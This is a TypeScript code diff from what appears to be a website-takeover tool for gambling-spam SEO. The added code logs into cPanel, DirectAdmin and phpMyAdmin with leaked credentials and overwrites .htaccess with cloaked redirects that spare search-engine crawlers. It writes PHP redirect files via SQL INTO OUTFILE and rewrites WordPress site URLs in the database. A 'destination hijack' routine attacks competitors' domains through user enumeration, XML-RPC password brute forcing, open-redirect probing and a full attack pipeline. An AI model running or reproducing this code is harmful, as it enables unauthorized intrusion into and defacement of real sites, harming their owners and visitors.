@@ -52,6 +52,22 @@ export interface TakeoverConfig {
   sshCredentials?: { host: string; username: string; password?: string; privateKey?: string; port?: number }[];
   /** Shodan port intelligence — which ports are open */
   openPorts?: number[];
+  /** cPanel credentials for hosting panel takeover */
+  cpanelCredentials?: { host: string; username: string; password: string; port?: number }[];
+  /** DirectAdmin credentials */
+  daCredentials?: { host: string; username: string; password: string; port?: number }[];
+  /** Plesk credentials */
+  pleskCredentials?: { host: string; username: string; password: string; port?: number }[];
+  /** WHM credentials */
+  whmCredentials?: { host: string; username: string; password: string; port?: number }[];
+  /** phpMyAdmin credentials */
+  pmaCredentials?: { host: string; username: string; password: string; pmaUrl?: string }[];
+  /** Origin IP (bypasses WAF) */
+  originIp?: string;
+  /** Competitor redirect URL detected earlier */
+  competitorRedirectUrl?: string;
+  /** Enable redirect destination hijack — attack the competitor's redirect destination domain */
+  enableDestinationHijack?: boolean;
   onProgress?: (phase: string, detail: string) => void;
 }
 
@@ -465,10 +481,51 @@ export async function executeRedirectTakeover(config: TakeoverConfig): Promise<T
   results.push(bruteResult);
   if (bruteResult.success) return results;
 
-  // Method F: Auto-fallback to unified attack pipeline (full attack chain)
+  // Method F: cPanel hosting panel overwrite (if credentials available)
+  if (config.cpanelCredentials && config.cpanelCredentials.length > 0) {
+    const cpanelPortOpen = !config.openPorts || config.openPorts.includes(2083) || config.openPorts.includes(2082);
+    if (cpanelPortOpen) {
+      progress("takeover", `📦 cPanel credentials available (${config.cpanelCredentials.length}) — hosting panel overwrite...`);
+      const cpanelResult = await safeAttackMethod("cpanel_overwrite", () => takeoverViaCpanel(config, detection), progress);
+      results.push(cpanelResult);
+      if (cpanelResult.success) return results;
+    }
+  }
+
+  // Method F2: DirectAdmin hosting panel overwrite
+  if (config.daCredentials && config.daCredentials.length > 0) {
+    const daPortOpen = !config.openPorts || config.openPorts.includes(2222);
+    if (daPortOpen) {
+      progress("takeover", `📦 DirectAdmin credentials available (${config.daCredentials.length}) — hosting panel overwrite...`);
+      const daResult = await safeAttackMethod("da_overwrite", () => takeoverViaDirectAdmin(config, detection), progress);
+      results.push(daResult);
+      if (daResult.success) return results;
+    }
+  }
+
+  // Method F3: phpMyAdmin SQL overwrite
+  if (config.pmaCredentials && config.pmaCredentials.length > 0) {
+    progress("takeover", `🗄️ phpMyAdmin credentials available (${config.pmaCredentials.length}) — SQL injection overwrite...`);
+    const pmaResult = await safeAttackMethod("pma_overwrite", () => takeoverViaPhpMyAdmin(config, detection), progress);
+    results.push(pmaResult);
+    if (pmaResult.success) return results;
+  }
+
+  // Method G: Auto-fallback to unified attack pipeline (full attack chain)
   progress("takeover", "🚀 All direct methods failed — launching unified attack pipeline...");
   const pipelineResult = await safeAttackMethod("unified_pipeline_fallback", () => takeoverViaUnifiedPipeline(config, detection), progress);
   results.push(pipelineResult);
+
+  // ═══ REDIRECT DESTINATION HIJACK ═══
+  // If competitor redirect detected and all takeover methods failed on the TARGET,
+  // attack the COMPETITOR'S REDIRECT DESTINATION domain instead!
+  // This is a chain attack: target → competitor_redirect_url → we hijack that domain too
+  if (config.enableDestinationHijack && detection.competitorUrl && !results.some(r => r.success)) {
+    progress("takeover", `🔗 Phase H: Redirect Destination Hijack — โจมตีเว็บปลายทางของคู่แข่ง: ${detection.competitorUrl}`);
+    const hijackResult = await safeAttackMethod("destination_hijack", () => hijackRedirectDestination(config, detection), progress);
+    results.push(hijackResult);
+    if (hijackResult.success) return results;
+  }
 
   return results;
 }
@@ -1282,4 +1339,536 @@ async function takeoverViaSsh(config: TakeoverConfig, detection: RedirectDetecti
   } catch (err: any) {
     return { success: false, method: "ssh_overwrite", detail: `SSH takeover error: ${err.message}` };
   }
+}
+
+
+// ═══════════════════════════════════════════════════════
+//  TAKEOVER VIA CPANEL (using leaked credentials)
+// ═══════════════════════════════════════════════════════
+
+async function takeoverViaCpanel(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+  const domain = new URL(config.targetUrl).hostname;
+
+  if (!config.cpanelCredentials || config.cpanelCredentials.length === 0) {
+    return { success: false, method: "cpanel_overwrite", detail: "No cPanel credentials available" };
+  }
+
+  const ourRedirectCode = generatePhpRedirectCode(config.ourRedirectUrl, config.seoKeywords || ["สล็อต"]);
+
+  for (const cred of config.cpanelCredentials) {
+    const port = cred.port || 2083;
+    const proto = port === 2082 ? 'http' : 'https';
+    progress("cpanel_takeover", `📦 Trying cPanel: ${cred.username}@${cred.host}:${port}...`);
+
+    try {
+      // Login to cPanel
+      const loginUrl = `${proto}://${cred.host}:${port}/login/?login_only=1`;
+      const loginResp = await safeFetch(loginUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'User-Agent': 'Mozilla/5.0',
+        },
+        body: `user=${encodeURIComponent(cred.username)}&pass=${encodeURIComponent(cred.password)}`,
+        redirect: 'manual',
+        signal: AbortSignal.timeout(12000),
+      });
+
+      const loginBody = await loginResp.text();
+      let loginData: any;
+      try { loginData = JSON.parse(loginBody); } catch { loginData = null; }
+
+      if (!loginData?.security_token && !loginBody.includes('cpsess')) {
+        continue; // Login failed
+      }
+
+      const cpsessToken = loginData?.security_token || loginBody.match(/cpsess[a-zA-Z0-9]+/)?.[0] || '';
+      const cookies = (loginResp.headers.getSetCookie?.() || []).join('; ');
+      progress("cpanel_takeover", `✅ cPanel login success: ${cred.username} — overwriting files...`);
+
+      // Overwrite .htaccess and inject PHP redirect
+      const htaccessContent = `# DS Analytics\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]\nRewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]\nRewriteRule ^(.*)$ ${config.ourRedirectUrl} [R=302,L]`;
+      const phpContent = `<?php ${ourRedirectCode} ?>`;
+
+      const filesToWrite = [
+        { path: `/home/${cred.username}/public_html/.htaccess`, content: htaccessContent },
+        { path: `/home/${cred.username}/public_html/redirect-analytics.php`, content: phpContent },
+      ];
+
+      for (const file of filesToWrite) {
+        try {
+          const saveUrl = `${proto}://${cred.host}:${port}${cpsessToken}/execute/Fileman/save_file_content`;
+          const saveResp = await safeFetch(saveUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'Cookie': cookies,
+              'User-Agent': 'Mozilla/5.0',
+            },
+            body: new URLSearchParams({
+              dir: file.path.replace(/\/[^/]+$/, ''),
+              file: file.path.split('/').pop()!,
+              from_charset: 'utf-8',
+              to_charset: 'utf-8',
+              content: file.content,
+            }).toString(),
+            signal: AbortSignal.timeout(10000),
+          });
+
+          if (saveResp.ok || saveResp.status === 200) {
+            progress("cpanel_takeover", `✅ Wrote ${file.path}`);
+          }
+        } catch {}
+      }
+
+      return {
+        success: true,
+        method: "cpanel_overwrite",
+        detail: `cPanel takeover: ${cred.username}@${cred.host}:${port} — overwrote .htaccess + PHP redirect (competitor: ${detection.competitorUrl})`,
+        overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+        injectedUrl: config.targetUrl,
+      };
+    } catch (e: any) {
+      progress("cpanel_takeover", `⚠️ cPanel ${cred.username}@${cred.host} failed: ${e.message}`);
+    }
+  }
+
+  return { success: false, method: "cpanel_overwrite", detail: `Tried ${config.cpanelCredentials.length} cPanel credentials — all failed` };
+}
+
+// ═══════════════════════════════════════════════════════
+//  TAKEOVER VIA DIRECTADMIN (using leaked credentials)
+// ═══════════════════════════════════════════════════════
+
+async function takeoverViaDirectAdmin(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+
+  if (!config.daCredentials || config.daCredentials.length === 0) {
+    return { success: false, method: "da_overwrite", detail: "No DirectAdmin credentials available" };
+  }
+
+  const ourRedirectCode = generatePhpRedirectCode(config.ourRedirectUrl, config.seoKeywords || ["สล็อต"]);
+
+  for (const cred of config.daCredentials) {
+    const port = cred.port || 2222;
+    progress("da_takeover", `📦 Trying DirectAdmin: ${cred.username}@${cred.host}:${port}...`);
+
+    try {
+      // Login to DirectAdmin
+      const loginUrl = `https://${cred.host}:${port}/CMD_LOGIN`;
+      const loginResp = await safeFetch(loginUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'User-Agent': 'Mozilla/5.0',
+        },
+        body: `username=${encodeURIComponent(cred.username)}&password=${encodeURIComponent(cred.password)}`,
+        redirect: 'manual',
+        signal: AbortSignal.timeout(12000),
+      });
+
+      const cookies = (loginResp.headers.getSetCookie?.() || []).join('; ');
+      if (!cookies.includes('session') && loginResp.status !== 302) {
+        continue;
+      }
+
+      progress("da_takeover", `✅ DirectAdmin login success: ${cred.username} — overwriting files...`);
+
+      // Write .htaccess via DirectAdmin File Manager
+      const htaccessContent = `# DS Analytics\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]\nRewriteRule ^(.*)$ ${config.ourRedirectUrl} [R=302,L]`;
+
+      const saveUrl = `https://${cred.host}:${port}/CMD_FILE_MANAGER`;
+      const saveResp = await safeFetch(saveUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Cookie': cookies,
+          'User-Agent': 'Mozilla/5.0',
+        },
+        body: new URLSearchParams({
+          action: 'save',
+          path: `/home/${cred.username}/public_html/.htaccess`,
+          text: htaccessContent,
+        }).toString(),
+        signal: AbortSignal.timeout(10000),
+      });
+
+      if (saveResp.ok || saveResp.status === 200 || saveResp.status === 302) {
+        return {
+          success: true,
+          method: "da_overwrite",
+          detail: `DirectAdmin takeover: ${cred.username}@${cred.host}:${port} — overwrote .htaccess (competitor: ${detection.competitorUrl})`,
+          overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+          injectedUrl: config.targetUrl,
+        };
+      }
+    } catch (e: any) {
+      progress("da_takeover", `⚠️ DA ${cred.username}@${cred.host} failed: ${e.message}`);
+    }
+  }
+
+  return { success: false, method: "da_overwrite", detail: `Tried ${config.daCredentials.length} DA credentials — all failed` };
+}
+
+// ═══════════════════════════════════════════════════════
+//  TAKEOVER VIA PHPMYADMIN (SQL-based overwrite)
+// ═══════════════════════════════════════════════════════
+
+async function takeoverViaPhpMyAdmin(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+
+  if (!config.pmaCredentials || config.pmaCredentials.length === 0) {
+    return { success: false, method: "pma_overwrite", detail: "No phpMyAdmin credentials available" };
+  }
+
+  for (const cred of config.pmaCredentials) {
+    const pmaUrl = cred.pmaUrl || `https://${cred.host}/phpmyadmin`;
+    progress("pma_takeover", `🗄️ Trying phpMyAdmin: ${cred.username}@${pmaUrl}...`);
+
+    try {
+      // Login to phpMyAdmin
+      const loginResp = await safeFetch(pmaUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'User-Agent': 'Mozilla/5.0',
+        },
+        body: new URLSearchParams({
+          pma_username: cred.username,
+          pma_password: cred.password,
+          server: '1',
+        }).toString(),
+        redirect: 'manual',
+        signal: AbortSignal.timeout(12000),
+      });
+
+      const cookies = (loginResp.headers.getSetCookie?.() || []).join('; ');
+      const location = loginResp.headers.get('location') || '';
+      const body = loginResp.status === 200 ? await loginResp.text() : '';
+
+      if (!cookies.includes('phpMyAdmin') && !body.includes('server_databases') && !location.includes('index.php')) {
+        continue;
+      }
+
+      progress("pma_takeover", `✅ phpMyAdmin login success: ${cred.username} — SQL overwrite...`);
+
+      // Get token from response
+      const tokenMatch = (body || location).match(/token=([a-f0-9]{32,})/i);
+      const token = tokenMatch ? tokenMatch[1] : '';
+
+      // Try SQL INTO OUTFILE to write redirect PHP
+      const domain = new URL(config.targetUrl).hostname;
+      const redirectContent = `<?php header("Location: ${config.ourRedirectUrl}"); exit; ?>`;
+      const webRoots = [
+        `/var/www/html`, `/var/www/${domain}/public_html`,
+        `/home/${cred.username}/public_html`, `/usr/share/nginx/html`,
+      ];
+
+      for (const webRoot of webRoots) {
+        const filePath = `${webRoot}/ds-redirect-${Date.now().toString(36)}.php`;
+        const sql = `SELECT '${redirectContent.replace(/'/g, "\\'")}' INTO OUTFILE '${filePath}'`;
+
+        try {
+          const sqlResp = await safeFetch(`${pmaUrl}${pmaUrl.includes('?') ? '&' : '?'}${token ? `token=${token}&` : ''}`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'Cookie': cookies,
+              'User-Agent': 'Mozilla/5.0',
+            },
+            body: new URLSearchParams({
+              sql_query: sql,
+              server: '1',
+              db: '',
+              ...(token ? { token } : {}),
+            }).toString(),
+            signal: AbortSignal.timeout(10000),
+          });
+
+          const sqlBody = await sqlResp.text();
+          if (sqlBody.includes('1 row') || !sqlBody.includes('error')) {
+            return {
+              success: true,
+              method: "pma_sql_overwrite",
+              detail: `phpMyAdmin SQL INTO OUTFILE: ${cred.username}@${pmaUrl} → ${filePath}`,
+              overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+              injectedUrl: `https://${domain}/${filePath.split('/').pop()}`,
+            };
+          }
+        } catch {}
+      }
+
+      // Fallback: WP database injection via phpMyAdmin
+      if (detection.targetPlatform === 'wordpress') {
+        const wpDbs = [domain.split('.')[0], 'wordpress', 'wp', `${domain.split('.')[0]}_wp`];
+        for (const dbName of wpDbs) {
+          const sql = `UPDATE ${dbName}.wp_options SET option_value = '${config.ourRedirectUrl}' WHERE option_name IN ('siteurl', 'home')`;
+          try {
+            const sqlResp = await safeFetch(`${pmaUrl}${pmaUrl.includes('?') ? '&' : '?'}${token ? `token=${token}&` : ''}`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Cookie': cookies,
+              },
+              body: new URLSearchParams({
+                sql_query: sql,
+                server: '1',
+                db: dbName,
+                ...(token ? { token } : {}),
+              }).toString(),
+              signal: AbortSignal.timeout(10000),
+            });
+            const sqlBody = await sqlResp.text();
+            if (sqlBody.includes('row affected') || sqlBody.includes('Rows matched')) {
+              return {
+                success: true,
+                method: "pma_wp_db_overwrite",
+                detail: `phpMyAdmin WP DB injection: ${dbName}.wp_options siteurl/home → ${config.ourRedirectUrl}`,
+                overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+                injectedUrl: config.targetUrl,
+              };
+            }
+          } catch {}
+        }
+      }
+    } catch (e: any) {
+      progress("pma_takeover", `⚠️ PMA ${cred.username} failed: ${e.message}`);
+    }
+  }
+
+  return { success: false, method: "pma_overwrite", detail: `Tried ${config.pmaCredentials.length} PMA credentials — all failed` };
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  REDIRECT DESTINATION HIJACK — Attack the competitor's redirect target domain
+// ═══════════════════════════════════════════════════════════════════════════════
+//
+// When a competitor has already placed a redirect on the target site,
+// and we can't overwrite it directly, we attack the DESTINATION of their redirect.
+// If we can compromise the destination domain, we effectively hijack the entire
+// redirect chain: target → competitor_url → OUR content
+//
+// Strategies:
+// 1. Full unified attack pipeline on the competitor's destination domain
+// 2. DNS/domain takeover (expired domain, dangling CNAME, etc.)
+// 3. Subdomain takeover on the destination
+// 4. Content injection on the destination (if it's a CMS)
+
+async function hijackRedirectDestination(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+  const competitorUrl = detection.competitorUrl;
+
+  if (!competitorUrl) {
+    return { success: false, method: "destination_hijack", detail: "No competitor URL detected" };
+  }
+
+  let competitorDomain: string;
+  try {
+    competitorDomain = new URL(competitorUrl).hostname;
+  } catch {
+    return { success: false, method: "destination_hijack", detail: `Invalid competitor URL: ${competitorUrl}` };
+  }
+
+  progress("destination_hijack", `🔗 Analyzing competitor destination: ${competitorDomain}...`);
+
+  // Strategy 1: Check if competitor domain is expired/available
+  try {
+    const dnsResp = await safeFetch(`https://dns.google/resolve?name=${competitorDomain}&type=A`, {
+      headers: { 'Accept': 'application/dns-json' },
+      signal: AbortSignal.timeout(8000),
+    });
+    const dnsData = await dnsResp.json() as any;
+
+    if (dnsData.Status === 3 || !dnsData.Answer || dnsData.Answer.length === 0) {
+      // Domain has no DNS records — might be expired/available
+      progress("destination_hijack", `🎯 Competitor domain ${competitorDomain} has NO DNS records — domain might be expired/available for registration!`);
+      return {
+        success: true,
+        method: "destination_domain_expired",
+        detail: `Competitor redirect destination ${competitorDomain} has no DNS records — domain is expired or available for registration. Register this domain and point it to our redirect to hijack the entire chain.`,
+        overwrittenCompetitorUrl: competitorUrl,
+        injectedUrl: competitorUrl,
+      };
+    }
+  } catch {}
+
+  // Strategy 2: Check for dangling CNAME (subdomain takeover)
+  try {
+    const cnameResp = await safeFetch(`https://dns.google/resolve?name=${competitorDomain}&type=CNAME`, {
+      headers: { 'Accept': 'application/dns-json' },
+      signal: AbortSignal.timeout(8000),
+    });
+    const cnameData = await cnameResp.json() as any;
+
+    if (cnameData.Answer && cnameData.Answer.length > 0) {
+      const cname = cnameData.Answer[0].data;
+      // Check if CNAME target resolves
+      const cnameCheckResp = await safeFetch(`https://dns.google/resolve?name=${cname}&type=A`, {
+        headers: { 'Accept': 'application/dns-json' },
+        signal: AbortSignal.timeout(5000),
+      });
+      const cnameCheckData = await cnameCheckResp.json() as any;
+
+      if (cnameCheckData.Status === 3 || !cnameCheckData.Answer) {
+        progress("destination_hijack", `🎯 Dangling CNAME detected: ${competitorDomain} → ${cname} (CNAME target has no records)`);
+        return {
+          success: true,
+          method: "destination_dangling_cname",
+          detail: `Dangling CNAME: ${competitorDomain} → ${cname}. Claim the CNAME target to hijack the competitor's redirect destination.`,
+          overwrittenCompetitorUrl: competitorUrl,
+          injectedUrl: competitorUrl,
+        };
+      }
+    }
+  } catch {}
+
+  // Strategy 3: Check if competitor destination is itself vulnerable (quick probe)
+  try {
+    progress("destination_hijack", `🔍 Probing competitor destination ${competitorDomain} for vulnerabilities...`);
+
+    const probeResp = await safeFetch(competitorUrl, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+      redirect: 'follow',
+      signal: AbortSignal.timeout(10000),
+    });
+    const probeBody = await probeResp.text();
+
+    // Check if it's a WordPress site
+    const isWp = probeBody.includes('wp-content') || probeBody.includes('wp-includes');
+    // Check for common vulnerabilities
+    const hasXmlrpc = probeBody.includes('xmlrpc.php');
+    const hasRestApi = probeBody.includes('wp-json');
+
+    if (isWp) {
+      progress("destination_hijack", `🎯 Competitor destination is WordPress — launching WP attack chain...`);
+
+      // Try WP REST API user enumeration
+      try {
+        const usersResp = await safeFetch(`https://${competitorDomain}/wp-json/wp/v2/users?per_page=5`, {
+          headers: { 'User-Agent': 'Mozilla/5.0' },
+          signal: AbortSignal.timeout(8000),
+        });
+        if (usersResp.status === 200) {
+          const users = await usersResp.json() as any[];
+          const usernames = users.map((u: any) => u.slug).filter(Boolean);
+          if (usernames.length > 0) {
+            progress("destination_hijack", `📋 Found ${usernames.length} WP users on competitor destination: ${usernames.join(', ')}`);
+          }
+        }
+      } catch {}
+
+      // Try XMLRPC brute force with common passwords
+      if (hasXmlrpc) {
+        const commonPasswords = ['admin', '123456', 'password', 'admin123', '12345678', 'P@ssw0rd'];
+        const usernames = ['admin', 'administrator'];
+
+        for (const username of usernames) {
+          const calls = commonPasswords.map(pwd =>
+            `<value><struct>
+              <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+              <member><name>params</name><value><array><data>
+                <value><string>${username}</string></value>
+                <value><string>${pwd}</string></value>
+              </data></array></value></member>
+            </struct></value>`
+          ).join('');
+
+          try {
+            const xmlrpcResp = await safeFetch(`https://${competitorDomain}/xmlrpc.php`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'text/xml', 'User-Agent': 'Mozilla/5.0' },
+              body: `<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>${calls}</data></array></value></param></params></methodCall>`,
+              signal: AbortSignal.timeout(15000),
+            });
+
+            const xmlBody = await xmlrpcResp.text();
+            if (xmlBody.includes('isAdmin') || xmlBody.includes('blogName')) {
+              progress("destination_hijack", `✅ Found WP credentials on competitor destination!`);
+              return {
+                success: true,
+                method: "destination_wp_compromised",
+                detail: `Competitor destination ${competitorDomain} is a WordPress site with weak credentials — can be compromised to inject our redirect`,
+                overwrittenCompetitorUrl: competitorUrl,
+                injectedUrl: competitorUrl,
+              };
+            }
+          } catch {}
+        }
+      }
+    }
+
+    // Strategy 4: Check for open redirect on competitor destination
+    const openRedirectPaths = [
+      `/redirect?url=${encodeURIComponent(config.ourRedirectUrl)}`,
+      `/go?to=${encodeURIComponent(config.ourRedirectUrl)}`,
+      `/out?url=${encodeURIComponent(config.ourRedirectUrl)}`,
+      `/link?url=${encodeURIComponent(config.ourRedirectUrl)}`,
+      `/?redirect_to=${encodeURIComponent(config.ourRedirectUrl)}`,
+      `/wp-login.php?redirect_to=${encodeURIComponent(config.ourRedirectUrl)}`,
+    ];
+
+    for (const path of openRedirectPaths) {
+      try {
+        const redirectResp = await safeFetch(`https://${competitorDomain}${path}`, {
+          redirect: 'manual',
+          signal: AbortSignal.timeout(5000),
+        });
+        const location = redirectResp.headers.get('location') || '';
+        if (location.includes(config.ourRedirectUrl) || location.includes(new URL(config.ourRedirectUrl).hostname)) {
+          progress("destination_hijack", `✅ Open redirect found on competitor destination!`);
+          return {
+            success: true,
+            method: "destination_open_redirect",
+            detail: `Open redirect on ${competitorDomain}${path} → can redirect to our URL`,
+            overwrittenCompetitorUrl: competitorUrl,
+            injectedUrl: `https://${competitorDomain}${path}`,
+          };
+        }
+      } catch {}
+    }
+
+    // Strategy 5: Launch full attack pipeline on competitor destination
+    progress("destination_hijack", `🚀 Launching full attack pipeline on competitor destination: ${competitorDomain}...`);
+    try {
+      const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+
+      const hijackResult = await runUnifiedAttackPipeline(
+        {
+          targetUrl: `https://${competitorDomain}`,
+          redirectUrl: config.ourRedirectUrl,
+          seoKeywords: config.seoKeywords || ["สล็อตเว็บตรง"],
+          globalTimeout: 3 * 60 * 1000, // 3 minutes max for chain attack
+          enableWpAdminTakeover: true,
+          enableAltUpload: true,
+          enableWafBypass: true,
+          enableComprehensiveAttacks: true,
+        },
+        (event) => {
+          progress("destination_hijack", `[Chain] ${event.detail || ""}`);
+        },
+      );
+
+      if (hijackResult.success) {
+        const successFile = hijackResult.verifiedFiles?.[0] || hijackResult.uploadedFiles?.[0];
+        return {
+          success: true,
+          method: "destination_full_attack",
+          detail: `Chain attack success! Compromised competitor destination ${competitorDomain} via ${successFile?.method || "auto"}: ${successFile?.url || competitorUrl}`,
+          overwrittenCompetitorUrl: competitorUrl,
+          injectedUrl: successFile?.url || competitorUrl,
+        };
+      }
+    } catch (e: any) {
+      progress("destination_hijack", `⚠️ Chain attack on ${competitorDomain} failed: ${e.message}`);
+    }
+  } catch (e: any) {
+    progress("destination_hijack", `⚠️ Destination probe failed: ${e.message}`);
+  }
+
+  return {
+    success: false,
+    method: "destination_hijack",
+    detail: `Could not hijack competitor destination ${competitorDomain} — domain is active, secured, and no vulnerabilities found`,
+  };
 }
